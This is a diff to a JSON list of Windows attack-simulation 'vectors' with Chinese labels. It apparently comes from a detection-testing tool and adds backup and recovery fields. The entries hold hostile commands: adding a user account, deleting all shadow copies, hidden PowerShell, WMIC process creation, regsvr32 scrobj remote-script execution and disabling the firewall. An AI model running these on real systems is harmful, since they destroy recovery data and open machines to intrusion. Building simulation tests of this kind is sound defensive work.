@@ -2,43 +2,57 @@
     {
         "vector_name":"CmdAddNetUser",
         "vector_cn_name":"命令行添加用户账户",
-        "command":"net1 user test test /add"
+        "command":"net1 user test test /add",
+        "backup": 1,
+        "recovery": "net1 user test /del"
     },
 
     {
         "vector_name":"CmdDelNetUser",
         "vector_cn_name":"命令行删除用户账户",
-        "command":"net1 user test /del"
+        "command":"net1 user test /del",
+        "backup": 0,
+        "recovery": ""
     },
 
     {
         "vector_name":"DelShadows",
         "vector_cn_name":"删除卷影还原点",
-        "command":"vssadmin delete shadows /all /quiet"
+        "command":"vssadmin delete shadows /all /quiet",
+        "backup": 0,
+        "recovery": ""
     },
 
     {
         "vector_name":"HiddenExecPowershell",
         "vector_cn_name":"隐藏执行powershell",
-        "command":"powershell -windowstyle hidden"
+        "command":"powershell -windowstyle hidden",
+        "backup": 0,
+        "recovery": ""
     },
 
     {
         "vector_name":"WmiExecProc",
         "vector_cn_name":"通过WMIC启动可疑进程",
-        "command":"wmic process call create calc"
+        "command":"wmic process call create calc",
+        "backup": 0,
+        "recovery": ""
     },
 
     {
         "vector_name":"ScrobjRemoteExec",
         "vector_cn_name":"Scrobj远程脚本执行",
-        "command":"regsvr32 /s /n /u /i:http://127.0.0.1/1.sct scrobj.dll"
+        "command":"regsvr32 /s /n /u /i:http://127.0.0.1/1.sct scrobj.dll",
+        "backup": 0,
+        "recovery": ""
     },
 
     {
         "vector_name":"CloseFireWall",
         "vector_cn_name":"关闭防火墙",
-        "command":"netsh advfirewall set allprofiles state off"
+        "command":"netsh advfirewall set allprofiles state off",
+        "backup": 1,
+        "recovery": "netsh advfirewall set allprofiles state on"
     }
 
 ]
